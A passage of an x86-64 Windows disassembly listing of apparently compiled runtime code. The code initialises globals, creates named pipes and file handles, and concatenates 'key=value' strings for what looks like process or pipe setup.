    6d8ca89a:	48 89 15 f7 20 0f 00 	mov    %rdx,0xf20f7(%rip)        # 0x6d9bc998
    6d8ca8a1:	48 8d 51 30          	lea    0x30(%rcx),%rdx
    6d8ca8a5:	48 89 15 b4 21 0f 00 	mov    %rdx,0xf21b4(%rip)        # 0x6d9bca60
    6d8ca8ac:	48 8d 15 cd 44 10 00 	lea    0x1044cd(%rip),%rdx        # 0x6d9ced80
    6d8ca8b3:	48 89 05 36 21 0f 00 	mov    %rax,0xf2136(%rip)        # 0x6d9bc9f0
    6d8ca8ba:	48 8d 05 58 87 00 00 	lea    0x8758(%rip),%rax        # 0x6d8d3019
    6d8ca8c1:	48 89 15 f8 20 0f 00 	mov    %rdx,0xf20f8(%rip)        # 0x6d9bc9c0
    6d8ca8c8:	48 8d 15 11 21 0f 00 	lea    0xf2111(%rip),%rdx        # 0x6d9bc9e0
    6d8ca8cf:	48 89 05 22 21 0f 00 	mov    %rax,0xf2122(%rip)        # 0x6d9bc9f8
    6d8ca8d6:	48 8d 05 43 21 0f 00 	lea    0xf2143(%rip),%rax        # 0x6d9bca20
    6d8ca8dd:	48 89 05 44 1f 0f 00 	mov    %rax,0xf1f44(%rip)        # 0x6d9bc828
    6d8ca8e4:	48 8d 82 20 fe ff ff 	lea    -0x1e0(%rdx),%rax
    6d8ca8eb:	48 89 05 6e 45 10 00 	mov    %rax,0x10456e(%rip)        # 0x6d9cee60
    6d8ca8f2:	48 8d 05 47 45 10 00 	lea    0x104547(%rip),%rax        # 0x6d9cee40
    6d8ca8f9:	48 89 0d 58 21 0f 00 	mov    %rcx,0xf2158(%rip)        # 0x6d9bca58
    6d8ca900:	48 8d 0d 04 87 00 00 	lea    0x8704(%rip),%rcx        # 0x6d8d300b
    6d8ca907:	48 89 05 ca 44 10 00 	mov    %rax,0x1044ca(%rip)        # 0x6d9cedd8
    6d8ca90e:	48 8d 05 6b fc ff ff 	lea    -0x395(%rip),%rax        # 0x6d8ca580
    6d8ca915:	c6 05 64 20 0f 00 01 	movb   $0x1,0xf2064(%rip)        # 0x6d9bc980
    6d8ca91c:	48 c7 05 61 20 0f 00 	movq   $0x40,0xf2061(%rip)        # 0x6d9bc988
    6d8ca923:	40 00 00 00 
    6d8ca927:	48 c7 05 66 44 10 00 	movq   $0x0,0x104466(%rip)        # 0x6d9ced98
    6d8ca92e:	00 00 00 00 
    6d8ca932:	48 c7 05 43 44 10 00 	movq   $0x8,0x104443(%rip)        # 0x6d9ced80
    6d8ca939:	08 00 00 00 
    6d8ca93d:	48 c7 05 40 44 10 00 	movq   $0x8,0x104440(%rip)        # 0x6d9ced88
    6d8ca944:	08 00 00 00 
    6d8ca948:	66 c7 05 3f 44 10 00 	movw   $0x319,0x10443f(%rip)        # 0x6d9ced90
    6d8ca94f:	19 03 
    6d8ca951:	c6 05 58 20 0f 00 01 	movb   $0x1,0xf2058(%rip)        # 0x6d9bc9b0
    6d8ca958:	48 c7 05 55 20 0f 00 	movq   $0x48,0xf2055(%rip)        # 0x6d9bc9b8
    6d8ca95f:	48 00 00 00 
    6d8ca963:	48 89 0d 5e 20 0f 00 	mov    %rcx,0xf205e(%rip)        # 0x6d9bc9c8
    6d8ca96a:	48 89 15 f7 20 0f 00 	mov    %rdx,0xf20f7(%rip)        # 0x6d9bca68
    6d8ca971:	c6 05 68 20 0f 00 01 	movb   $0x1,0xf2068(%rip)        # 0x6d9bc9e0
    6d8ca978:	48 c7 05 65 20 0f 00 	movq   $0x50,0xf2065(%rip)        # 0x6d9bc9e8
    6d8ca97f:	50 00 00 00 
    6d8ca983:	48 c7 05 92 1e 0f 00 	movq   $0xa,0xf1e92(%rip)        # 0x6d9bc820
    6d8ca98a:	0a 00 00 00 
    6d8ca98e:	c6 05 6b 1e 0f 00 02 	movb   $0x2,0xf1e6b(%rip)        # 0x6d9bc800
    6d8ca995:	48 c7 05 20 44 10 00 	movq   $0x8,0x104420(%rip)        # 0x6d9cedc0
    6d8ca99c:	08 00 00 00 
    6d8ca9a0:	48 c7 05 1d 44 10 00 	movq   $0x8,0x10441d(%rip)        # 0x6d9cedc8
    6d8ca9a7:	08 00 00 00 
    6d8ca9ab:	c6 05 1e 44 10 00 16 	movb   $0x16,0x10441e(%rip)        # 0x6d9cedd0
    6d8ca9b2:	48 89 05 37 44 10 00 	mov    %rax,0x104437(%rip)        # 0x6d9cedf0
    6d8ca9b9:	c3                   	ret
    6d8ca9ba:	90                   	nop
    6d8ca9bb:	90                   	nop
    6d8ca9bc:	90                   	nop
    6d8ca9bd:	90                   	nop
    6d8ca9be:	90                   	nop
    6d8ca9bf:	90                   	nop
    6d8ca9c0:	48 8d 05 79 86 00 00 	lea    0x8679(%rip),%rax        # 0x6d8d3040
    6d8ca9c7:	48 85 c9             	test   %rcx,%rcx
    6d8ca9ca:	74 0a                	je     0x6d8ca9d6
    6d8ca9cc:	48 83 39 00          	cmpq   $0x0,(%rcx)
    6d8ca9d0:	74 04                	je     0x6d8ca9d6
    6d8ca9d2:	48 8d 41 10          	lea    0x10(%rcx),%rax
    6d8ca9d6:	c3                   	ret
    6d8ca9d7:	56                   	push   %rsi
    6d8ca9d8:	53                   	push   %rbx
    6d8ca9d9:	48 83 ec 28          	sub    $0x28,%rsp
    6d8ca9dd:	48 89 ce             	mov    %rcx,%rsi
    6d8ca9e0:	48 8b 49 30          	mov    0x30(%rcx),%rcx
    6d8ca9e4:	48 89 d3             	mov    %rdx,%rbx
    6d8ca9e7:	e8 0a 8b ff ff       	call   0x6d8c34f6
    6d8ca9ec:	48 8b 4e 38          	mov    0x38(%rsi),%rcx
    6d8ca9f0:	48 89 da             	mov    %rbx,%rdx
    6d8ca9f3:	e8 fe 8a ff ff       	call   0x6d8c34f6
    6d8ca9f8:	48 8b 4e 40          	mov    0x40(%rsi),%rcx
    6d8ca9fc:	48 89 da             	mov    %rbx,%rdx
    6d8ca9ff:	48 83 c4 28          	add    $0x28,%rsp
    6d8caa03:	5b                   	pop    %rbx
    6d8caa04:	5e                   	pop    %rsi
    6d8caa05:	e9 ec 8a ff ff       	jmp    0x6d8c34f6
    6d8caa0a:	48 83 ec 28          	sub    $0x28,%rsp
    6d8caa0e:	48 8b 05 8b db 0e 00 	mov    0xedb8b(%rip),%rax        # 0x6d9b85a0
    6d8caa15:	ff 10                	call   *(%rax)
    6d8caa17:	85 c0                	test   %eax,%eax
    6d8caa19:	75 12                	jne    0x6d8caa2d
    6d8caa1b:	e8 a5 df ff ff       	call   0x6d8c89c5
    6d8caa20:	31 d2                	xor    %edx,%edx
    6d8caa22:	89 c1                	mov    %eax,%ecx
    6d8caa24:	48 83 c4 28          	add    $0x28,%rsp
    6d8caa28:	e9 63 df ff ff       	jmp    0x6d8c8990
    6d8caa2d:	48 83 c4 28          	add    $0x28,%rsp
    6d8caa31:	c3                   	ret
    6d8caa32:	57                   	push   %rdi
    6d8caa33:	56                   	push   %rsi
    6d8caa34:	48 8b 3a             	mov    (%rdx),%rdi
    6d8caa37:	48 8d 72 10          	lea    0x10(%rdx),%rsi
    6d8caa3b:	48 89 c8             	mov    %rcx,%rax
    6d8caa3e:	48 8b 09             	mov    (%rcx),%rcx
    6d8caa41:	4c 8d 44 08 10       	lea    0x10(%rax,%rcx,1),%r8
    6d8caa46:	48 8d 4f 01          	lea    0x1(%rdi),%rcx
    6d8caa4a:	4c 89 c7             	mov    %r8,%rdi
    6d8caa4d:	f3 a4                	rep movsb (%rsi),(%rdi)
    6d8caa4f:	48 8b 12             	mov    (%rdx),%rdx
    6d8caa52:	48 01 10             	add    %rdx,(%rax)
    6d8caa55:	5e                   	pop    %rsi
    6d8caa56:	5f                   	pop    %rdi
    6d8caa57:	c3                   	ret
    6d8caa58:	48 85 d2             	test   %rdx,%rdx
    6d8caa5b:	74 02                	je     0x6d8caa5f
    6d8caa5d:	eb d3                	jmp    0x6d8caa32
    6d8caa5f:	c3                   	ret
    6d8caa60:	57                   	push   %rdi
    6d8caa61:	48 83 ec 40          	sub    $0x40,%rsp
    6d8caa65:	31 c0                	xor    %eax,%eax
    6d8caa67:	4c 8d 44 24 28       	lea    0x28(%rsp),%r8
    6d8caa6c:	49 89 ca             	mov    %rcx,%r10
    6d8caa6f:	b9 05 00 00 00       	mov    $0x5,%ecx
    6d8caa74:	c7 44 24 28 18 00 00 	movl   $0x18,0x28(%rsp)
    6d8caa7b:	00 
    6d8caa7c:	4d 8d 48 04          	lea    0x4(%r8),%r9
    6d8caa80:	4c 89 cf             	mov    %r9,%rdi
    6d8caa83:	45 31 c9             	xor    %r9d,%r9d
    6d8caa86:	f3 ab                	rep stos %eax,(%rdi)
    6d8caa88:	48 8b 05 21 db 0e 00 	mov    0xedb21(%rip),%rax        # 0x6d9b85b0
    6d8caa8f:	c7 44 24 38 01 00 00 	movl   $0x1,0x38(%rsp)
    6d8caa96:	00 
    6d8caa97:	4c 89 d1             	mov    %r10,%rcx
    6d8caa9a:	ff 10                	call   *(%rax)
    6d8caa9c:	85 c0                	test   %eax,%eax
    6d8caa9e:	75 0f                	jne    0x6d8caaaf
    6d8caaa0:	e8 20 df ff ff       	call   0x6d8c89c5
    6d8caaa5:	31 d2                	xor    %edx,%edx
    6d8caaa7:	89 c1                	mov    %eax,%ecx
    6d8caaa9:	e8 e2 de ff ff       	call   0x6d8c8990
    6d8caaae:	90                   	nop
    6d8caaaf:	48 83 c4 40          	add    $0x40,%rsp
    6d8caab3:	5f                   	pop    %rdi
    6d8caab4:	c3                   	ret
    6d8caab5:	56                   	push   %rsi
    6d8caab6:	53                   	push   %rbx
    6d8caab7:	48 83 ec 58          	sub    $0x58,%rsp
    6d8caabb:	48 8b 05 8e db 0e 00 	mov    0xedb8e(%rip),%rax        # 0x6d9b8650
    6d8caac2:	48 c7 44 24 48 00 00 	movq   $0x0,0x48(%rsp)
    6d8caac9:	00 00 
    6d8caacb:	48 89 cb             	mov    %rcx,%rbx
    6d8caace:	89 d6                	mov    %edx,%esi
    6d8caad0:	ff 10                	call   *(%rax)
    6d8caad2:	89 74 24 28          	mov    %esi,0x28(%rsp)
    6d8caad6:	4c 8d 4c 24 48       	lea    0x48(%rsp),%r9
    6d8caadb:	48 89 da             	mov    %rbx,%rdx
    6d8caade:	49 89 c0             	mov    %rax,%r8
    6d8caae1:	48 89 c1             	mov    %rax,%rcx
    6d8caae4:	48 8b 05 45 db 0e 00 	mov    0xedb45(%rip),%rax        # 0x6d9b8630
    6d8caaeb:	c7 44 24 30 02 00 00 	movl   $0x2,0x30(%rsp)
    6d8caaf2:	00 
    6d8caaf3:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%rsp)
    6d8caafa:	00 
    6d8caafb:	ff 10                	call   *(%rax)
    6d8caafd:	85 c0                	test   %eax,%eax
    6d8caaff:	75 0e                	jne    0x6d8cab0f
    6d8cab01:	e8 bf de ff ff       	call   0x6d8c89c5
    6d8cab06:	31 d2                	xor    %edx,%edx
    6d8cab08:	89 c1                	mov    %eax,%ecx
    6d8cab0a:	e8 81 de ff ff       	call   0x6d8c8990
    6d8cab0f:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
    6d8cab14:	48 83 c4 58          	add    $0x58,%rsp
    6d8cab18:	5b                   	pop    %rbx
    6d8cab19:	5e                   	pop    %rsi
    6d8cab1a:	c3                   	ret
    6d8cab1b:	41 57                	push   %r15
    6d8cab1d:	41 56                	push   %r14
    6d8cab1f:	41 55                	push   %r13
    6d8cab21:	41 54                	push   %r12
    6d8cab23:	55                   	push   %rbp
    6d8cab24:	57                   	push   %rdi
    6d8cab25:	56                   	push   %rsi
    6d8cab26:	53                   	push   %rbx
    6d8cab27:	48 83 ec 68          	sub    $0x68,%rsp
    6d8cab2b:	31 c0                	xor    %eax,%eax
    6d8cab2d:	48 8b ac 24 d0 00 00 	mov    0xd0(%rsp),%rbp
    6d8cab34:	00 
    6d8cab35:	48 8d 5c 24 48       	lea    0x48(%rsp),%rbx
    6d8cab3a:	48 89 94 24 b8 00 00 	mov    %rdx,0xb8(%rsp)
    6d8cab41:	00 
    6d8cab42:	48 89 ce             	mov    %rcx,%rsi
    6d8cab45:	b9 05 00 00 00       	mov    $0x5,%ecx
    6d8cab4a:	48 8d 53 04          	lea    0x4(%rbx),%rdx
    6d8cab4e:	4d 89 c4             	mov    %r8,%r12
    6d8cab51:	4d 89 ce             	mov    %r9,%r14
    6d8cab54:	c7 44 24 48 18 00 00 	movl   $0x18,0x48(%rsp)
    6d8cab5b:	00 
    6d8cab5c:	48 89 d7             	mov    %rdx,%rdi
    6d8cab5f:	f3 ab                	rep stos %eax,(%rdi)
    6d8cab61:	48 89 e9             	mov    %rbp,%rcx
    6d8cab64:	c7 44 24 58 01 00 00 	movl   $0x1,0x58(%rsp)
    6d8cab6b:	00 
    6d8cab6c:	e8 6f 69 ff ff       	call   0x6d8c14e0
    6d8cab71:	b9 0f 00 00 00       	mov    $0xf,%ecx
    6d8cab76:	48 85 c0             	test   %rax,%rax
    6d8cab79:	48 89 c7             	mov    %rax,%rdi
    6d8cab7c:	74 07                	je     0x6d8cab85
    6d8cab7e:	48 8b 00             	mov    (%rax),%rax
    6d8cab81:	48 8d 48 0f          	lea    0xf(%rax),%rcx
    6d8cab85:	e8 ca 93 ff ff       	call   0x6d8c3f54
    6d8cab8a:	48 8d 15 4f 86 00 00 	lea    0x864f(%rip),%rdx        # 0x6d8d31e0
    6d8cab91:	48 89 c1             	mov    %rax,%rcx
    6d8cab94:	49 89 c1             	mov    %rax,%r9
    6d8cab97:	e8 96 fe ff ff       	call   0x6d8caa32
    6d8cab9c:	48 89 fa             	mov    %rdi,%rdx
    6d8cab9f:	4c 89 c9             	mov    %r9,%rcx
    6d8caba2:	e8 b1 fe ff ff       	call   0x6d8caa58
    6d8caba7:	4c 89 c9             	mov    %r9,%rcx
    6d8cabaa:	e8 a4 6c ff ff       	call   0x6d8c1853
    6d8cabaf:	48 89 e9             	mov    %rbp,%rcx
    6d8cabb2:	49 89 c7             	mov    %rax,%r15
    6d8cabb5:	e8 26 69 ff ff       	call   0x6d8c14e0
    6d8cabba:	b9 0e 00 00 00       	mov    $0xe,%ecx
    6d8cabbf:	48 85 c0             	test   %rax,%rax
    6d8cabc2:	48 89 c7             	mov    %rax,%rdi
    6d8cabc5:	74 07                	je     0x6d8cabce
    6d8cabc7:	48 8b 00             	mov    (%rax),%rax
    6d8cabca:	48 8d 48 0e          	lea    0xe(%rax),%rcx
    6d8cabce:	e8 81 93 ff ff       	call   0x6d8c3f54
    6d8cabd3:	48 8d 15 e6 85 00 00 	lea    0x85e6(%rip),%rdx        # 0x6d8d31c0
    6d8cabda:	48 89 c1             	mov    %rax,%rcx
    6d8cabdd:	49 89 c1             	mov    %rax,%r9
    6d8cabe0:	e8 4d fe ff ff       	call   0x6d8caa32
    6d8cabe5:	48 89 fa             	mov    %rdi,%rdx
    6d8cabe8:	4c 89 c9             	mov    %r9,%rcx
    6d8cabeb:	e8 68 fe ff ff       	call   0x6d8caa58
    6d8cabf0:	4c 89 c9             	mov    %r9,%rcx
    6d8cabf3:	e8 5b 6c ff ff       	call   0x6d8c1853
    6d8cabf8:	48 8b 2d c1 d9 0e 00 	mov    0xed9c1(%rip),%rbp        # 0x6d9b85c0
    6d8cabff:	4c 89 f9             	mov    %r15,%rcx
    6d8cac02:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
    6d8cac07:	49 89 c5             	mov    %rax,%r13
    6d8cac0a:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
    6d8cac11:	00 
    6d8cac12:	41 b9 01 00 00 00    	mov    $0x1,%r9d
    6d8cac18:	41 b8 01 00 00 00    	mov    $0x1,%r8d
    6d8cac1e:	c7 44 24 28 00 04 00 	movl   $0x400,0x28(%rsp)
    6d8cac25:	00 
    6d8cac26:	ba 01 00 00 80       	mov    $0x80000001,%edx
    6d8cac2b:	c7 44 24 20 00 04 00 	movl   $0x400,0x20(%rsp)
    6d8cac32:	00 
    6d8cac33:	ff 55 00             	call   *0x0(%rbp)
    6d8cac36:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
    6d8cac3a:	48 89 c7             	mov    %rax,%rdi
    6d8cac3d:	75 0e                	jne    0x6d8cac4d
    6d8cac3f:	e8 81 dd ff ff       	call   0x6d8c89c5
    6d8cac44:	31 d2                	xor    %edx,%edx
    6d8cac46:	89 c1                	mov    %eax,%ecx
    6d8cac48:	e8 43 dd ff ff       	call   0x6d8c8990
    6d8cac4d:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
    6d8cac52:	ba 02 00 00 80       	mov    $0x80000002,%edx
    6d8cac57:	4c 89 e9             	mov    %r13,%rcx
    6d8cac5a:	41 b9 01 00 00 00    	mov    $0x1,%r9d
    6d8cac60:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
    6d8cac67:	00 
    6d8cac68:	41 b8 01 00 00 00    	mov    $0x1,%r8d
    6d8cac6e:	c7 44 24 28 00 04 00 	movl   $0x400,0x28(%rsp)
    6d8cac75:	00 
    6d8cac76:	c7 44 24 20 00 04 00 	movl   $0x400,0x20(%rsp)
    6d8cac7d:	00 
    6d8cac7e:	ff 55 00             	call   *0x0(%rbp)
    6d8cac81:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
    6d8cac85:	48 89 c5             	mov    %rax,%rbp
    6d8cac88:	75 0e                	jne    0x6d8cac98
    6d8cac8a:	e8 36 dd ff ff       	call   0x6d8c89c5
    6d8cac8f:	31 d2                	xor    %edx,%edx
    6d8cac91:	89 c1                	mov    %eax,%ecx
    6d8cac93:	e8 f8 dc ff ff       	call   0x6d8c8990
    6d8cac98:	48 8b 05 c1 d9 0e 00 	mov    0xed9c1(%rip),%rax        # 0x6d9b8660
    6d8cac9f:	45 31 c0             	xor    %r8d,%r8d
    6d8caca2:	49 89 d9             	mov    %rbx,%r9
    6d8caca5:	4c 89 f9             	mov    %r15,%rcx
    6d8caca8:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
    6d8cacaf:	00 00 
    6d8cacb1:	ba 02 00 10 00       	mov    $0x100002,%edx
    6d8cacb6:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
    6d8cacbd:	00 
    6d8cacbe:	c7 44 24 20 03 00 00 	movl   $0x3,0x20(%rsp)
    6d8cacc5:	00 
    6d8cacc6:	ff 10                	call   *(%rax)
    6d8cacc8:	48 89 46 58          	mov    %rax,0x58(%rsi)
    6d8caccc:	48 ff c0             	inc    %rax
    6d8caccf:	75 0e                	jne    0x6d8cacdf
    6d8cacd1:	e8 ef dc ff ff       	call   0x6d8c89c5
    6d8cacd6:	31 d2                	xor    %edx,%edx
    6d8cacd8:	89 c1                	mov    %eax,%ecx
    6d8cacda:	e8 b1 dc ff ff       	call   0x6d8c8990
    6d8cacdf:	48 8b 4e 58          	mov    0x58(%rsi),%rcx
    6d8cace3:	ba 01 00 00 00       	mov    $0x1,%edx
    6d8cace8:	e8 c8 fd ff ff       	call   0x6d8caab5
    6d8caced:	45 31 c0             	xor    %r8d,%r8d
    6d8cacf0:	49 89 d9             	mov    %rbx,%r9
    6d8cacf3:	ba 01 00 10 00       	mov    $0x100001,%edx
    6d8cacf8:	48 89 46 60          	mov    %rax,0x60(%rsi)
    6d8cacfc:	48 8b 05 5d d9 0e 00 	mov    0xed95d(%rip),%rax        # 0x6d9b8660
    6d8cad03:	4c 89 e9             	mov    %r13,%rcx
    6d8cad06:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
    6d8cad0d:	00 00 
    6d8cad0f:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
    6d8cad16:	00 
    6d8cad17:	c7 44 24 20 03 00 00 	movl   $0x3,0x20(%rsp)
    6d8cad1e:	00 
    6d8cad1f:	ff 10                	call   *(%rax)
    6d8cad21:	48 89 46 50          	mov    %rax,0x50(%rsi)
    6d8cad25:	48 ff c0             	inc    %rax
    6d8cad28:	75 0e                	jne    0x6d8cad38
    6d8cad2a:	e8 96 dc ff ff       	call   0x6d8c89c5
    6d8cad2f:	31 d2                	xor    %edx,%edx
    6d8cad31:	89 c1                	mov    %eax,%ecx
    6d8cad33:	e8 58 dc ff ff       	call   0x6d8c8990
    6d8cad38:	31 d2                	xor    %edx,%edx
    6d8cad3a:	48 89 e9             	mov    %rbp,%rcx
    6d8cad3d:	e8 73 fd ff ff       	call   0x6d8caab5
    6d8cad42:	48 8b b4 24 b8 00 00 	mov    0xb8(%rsp),%rsi
    6d8cad49:	00 
    6d8cad4a:	31 d2                	xor    %edx,%edx
    6d8cad4c:	48 89 f9             	mov    %rdi,%rcx
    6d8cad4f:	48 89 06             	mov    %rax,(%rsi)
    6d8cad52:	e8 5e fd ff ff       	call   0x6d8caab5
    6d8cad57:	48 89 e9             	mov    %rbp,%rcx
    6d8cad5a:	49 89 04 24          	mov    %rax,(%r12)
    6d8cad5e:	e8 a7 fc ff ff       	call   0x6d8caa0a
    6d8cad63:	48 89 f9             	mov    %rdi,%rcx
    6d8cad66:	e8 9f fc ff ff       	call   0x6d8caa0a
    6d8cad6b:	49 8b 04 24          	mov    (%r12),%rax
    6d8cad6f:	49 89 06             	mov    %rax,(%r14)
    6d8cad72:	48 83 c4 68          	add    $0x68,%rsp
    6d8cad76:	5b                   	pop    %rbx
    6d8cad77:	5e                   	pop    %rsi
    6d8cad78:	5f                   	pop    %rdi
    6d8cad79:	5d                   	pop    %rbp
    6d8cad7a:	41 5c                	pop    %r12
    6d8cad7c:	41 5d                	pop    %r13
    6d8cad7e:	41 5e                	pop    %r14
    6d8cad80:	41 5f                	pop    %r15
    6d8cad82:	c3                   	ret
    6d8cad83:	41 54                	push   %r12
    6d8cad85:	55                   	push   %rbp
    6d8cad86:	57                   	push   %rdi
    6d8cad87:	56                   	push   %rsi
    6d8cad88:	53                   	push   %rbx
    6d8cad89:	48 83 ec 30          	sub    $0x30,%rsp
    6d8cad8d:	31 db                	xor    %ebx,%ebx
    6d8cad8f:	48 89 d5             	mov    %rdx,%rbp
    6d8cad92:	4d 89 c4             	mov    %r8,%r12
    6d8cad95:	e8 01 de ff ff       	call   0x6d8c8b9b
    6d8cad9a:	4c 39 e3             	cmp    %r12,%rbx
    6d8cad9d:	7d 49                	jge    0x6d8cade8
    6d8cad9f:	ba 20 00 00 00       	mov    $0x20,%edx
    6d8cada4:	48 89 c1             	mov    %rax,%rcx
    6d8cada7:	e8 51 92 ff ff       	call   0x6d8c3ffd
    6d8cadac:	48 8b 4c dd 00       	mov    0x0(%rbp,%rbx,8),%rcx
    6d8cadb1:	48 89 c7             	mov    %rax,%rdi
    6d8cadb4:	e8 e2 dd ff ff       	call   0x6d8c8b9b
    6d8cadb9:	31 d2                	xor    %edx,%edx
    6d8cadbb:	48 85 c0             	test   %rax,%rax
    6d8cadbe:	48 89 c6             	mov    %rax,%rsi
    6d8cadc1:	74 03                	je     0x6d8cadc6
    6d8cadc3:	48 8b 10             	mov    (%rax),%rdx
    6d8cadc6:	48 89 f9             	mov    %rdi,%rcx
    6d8cadc9:	48 ff c3             	inc    %rbx
    6d8cadcc:	e8 b6 91 ff ff       	call   0x6d8c3f87
    6d8cadd1:	48 89 f2             	mov    %rsi,%rdx
    6d8cadd4:	48 89 c1             	mov    %rax,%rcx
    6d8cadd7:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
    6d8caddc:	e8 77 fc ff ff       	call   0x6d8caa58
    6d8cade1:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
    6d8cade6:	eb b2                	jmp    0x6d8cad9a
    6d8cade8:	48 83 c4 30          	add    $0x30,%rsp
    6d8cadec:	5b                   	pop    %rbx
    6d8caded:	5e                   	pop    %rsi
    6d8cadee:	5f                   	pop    %rdi
    6d8cadef:	5d                   	pop    %rbp
    6d8cadf0:	41 5c                	pop    %r12
    6d8cadf2:	c3                   	ret
    6d8cadf3:	41 57                	push   %r15
    6d8cadf5:	41 56                	push   %r14
    6d8cadf7:	41 55                	push   %r13
    6d8cadf9:	41 54                	push   %r12
    6d8cadfb:	55                   	push   %rbp
    6d8cadfc:	57                   	push   %rdi
    6d8cadfd:	56                   	push   %rsi
    6d8cadfe:	53                   	push   %rbx
    6d8cadff:	48 83 ec 48          	sub    $0x48,%rsp
    6d8cae03:	31 c0                	xor    %eax,%eax
    6d8cae05:	49 89 d4             	mov    %rdx,%r12
    6d8cae08:	49 89 cd             	mov    %rcx,%r13
    6d8cae0b:	b9 04 00 00 00       	mov    $0x4,%ecx
    6d8cae10:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
    6d8cae15:	48 89 d7             	mov    %rdx,%rdi
    6d8cae18:	f3 ab                	rep stos %eax,(%rdi)
    6d8cae1a:	49 8b 44 24 10       	mov    0x10(%r12),%rax
    6d8cae1f:	48 85 c0             	test   %rax,%rax
    6d8cae22:	74 12                	je     0x6d8cae36
    6d8cae24:	48 8b 18             	mov    (%rax),%rbx
    6d8cae27:	31 d2                	xor    %edx,%edx
    6d8cae29:	48 83 c0 10          	add    $0x10,%rax
    6d8cae2d:	4c 8d 43 ff          	lea    -0x1(%rbx),%r8
    6d8cae31:	4c 39 c2             	cmp    %r8,%rdx
    6d8cae34:	7e 35                	jle    0x6d8cae6b
    6d8cae36:	48 83 c1 02          	add    $0x2,%rcx
    6d8cae3a:	31 ed                	xor    %ebp,%ebp
    6d8cae3c:	e8 61 78 ff ff       	call   0x6d8c26a2
    6d8cae41:	49 89 c6             	mov    %rax,%r14
    6d8cae44:	49 8b 44 24 10       	mov    0x10(%r12),%rax
    6d8cae49:	48 85 c0             	test   %rax,%rax
    6d8cae4c:	0f 84 f5 00 00 00    	je     0x6d8caf47
    6d8cae52:	48 8b 28             	mov    (%rax),%rbp
    6d8cae55:	4c 8d 3d 44 83 00 00 	lea    0x8344(%rip),%r15        # 0x6d8d31a0
    6d8cae5c:	31 db                	xor    %ebx,%ebx
    6d8cae5e:	48 8d 45 ff          	lea    -0x1(%rbp),%rax
    6d8cae62:	31 ed                	xor    %ebp,%ebp
    6d8cae64:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
    6d8cae69:	eb 46                	jmp    0x6d8caeb1
    6d8cae6b:	80 78 10 00          	cmpb   $0x0,0x10(%rax)
    6d8cae6f:	74 25                	je     0x6d8cae96
    6d8cae71:	4c 8b 08             	mov    (%rax),%r9
    6d8cae74:	45 31 d2             	xor    %r10d,%r10d
    6d8cae77:	4c 8b 58 08          	mov    0x8(%rax),%r11
    6d8cae7b:	4d 85 c9             	test   %r9,%r9
    6d8cae7e:	74 03                	je     0x6d8cae83
    6d8cae80:	4d 8b 11             	mov    (%r9),%r10
    6d8cae83:	45 31 c9             	xor    %r9d,%r9d
    6d8cae86:	4d 85 db             	test   %r11,%r11
    6d8cae89:	74 03                	je     0x6d8cae8e
    6d8cae8b:	4d 8b 0b             	mov    (%r11),%r9
    6d8cae8e:	4f 8d 4c 0a 02       	lea    0x2(%r10,%r9,1),%r9
    6d8cae93:	4c 01 c9             	add    %r9,%rcx
    6d8cae96:	48 ff c2             	inc    %rdx
    6d8cae99:	48 83 c0 18          	add    $0x18,%rax
    6d8cae9d:	eb 92                	jmp    0x6d8cae31
    6d8cae9f:	48 6b c3 18          	imul   $0x18,%rbx,%rax
    6d8caea3:	49 03 44 24 10       	add    0x10(%r12),%rax
    6d8caea8:	80 78 20 00          	cmpb   $0x0,0x20(%rax)
    6d8caeac:	75 0f                	jne    0x6d8caebd
    6d8caeae:	48 ff c3             	inc    %rbx
    6d8caeb1:	48 3b 5c 24 28       	cmp    0x28(%rsp),%rbx
    6d8caeb6:	7e e7                	jle    0x6d8cae9f
    6d8caeb8:	e9 8a 00 00 00       	jmp    0x6d8caf47
    6d8caebd:	48 8b 78 10          	mov    0x10(%rax),%rdi
    6d8caec1:	31 d2                	xor    %edx,%edx
    6d8caec3:	48 8b 70 18          	mov    0x18(%rax),%rsi
    6d8caec7:	48 85 ff             	test   %rdi,%rdi
    6d8caeca:	74 03                	je     0x6d8caecf
    6d8caecc:	48 8b 17             	mov    (%rdi),%rdx
    6d8caecf:	31 c0                	xor    %eax,%eax
    6d8caed1:	48 85 f6             	test   %rsi,%rsi
    6d8caed4:	74 03                	je     0x6d8caed9
    6d8caed6:	48 8b 06             	mov    (%rsi),%rax
    6d8caed9:	48 8d 4c 02 01       	lea    0x1(%rdx,%rax,1),%rcx
    6d8caede:	e8 71 90 ff ff       	call   0x6d8c3f54
    6d8caee3:	48 89 fa             	mov    %rdi,%rdx
    6d8caee6:	48 89 c1             	mov    %rax,%rcx
    6d8caee9:	49 89 c1             	mov    %rax,%r9
    6d8caeec:	e8 67 fb ff ff       	call   0x6d8caa58
    6d8caef1:	4c 89 fa             	mov    %r15,%rdx
    6d8caef4:	4c 89 c9             	mov    %r9,%rcx
    6d8caef7:	e8 36 fb ff ff       	call   0x6d8caa32
    6d8caefc:	48 89 f2             	mov    %rsi,%rdx
    6d8caeff:	4c 89 c9             	mov    %r9,%rcx
    6d8caf02:	e8 51 fb ff ff       	call   0x6d8caa58
    6d8caf07:	ba 01 00 00 00       	mov    $0x1,%edx
    6d8caf0c:	4d 85 c9             	test   %r9,%r9
    6d8caf0f:	74 07                	je     0x6d8caf18
    6d8caf11:	49 8b 01             	mov    (%r9),%rax
    6d8caf14:	48 8d 50 01          	lea    0x1(%rax),%rdx
    6d8caf18:	4c 89 c9             	mov    %r9,%rcx
    6d8caf1b:	e8 a0 fa ff ff       	call   0x6d8ca9c0
    6d8caf20:	4d 8d 14 2e          	lea    (%r14,%rbp,1),%r10
    6d8caf24:	4d 85 c9             	test   %r9,%r9
    6d8caf27:	48 89 c6             	mov    %rax,%rsi
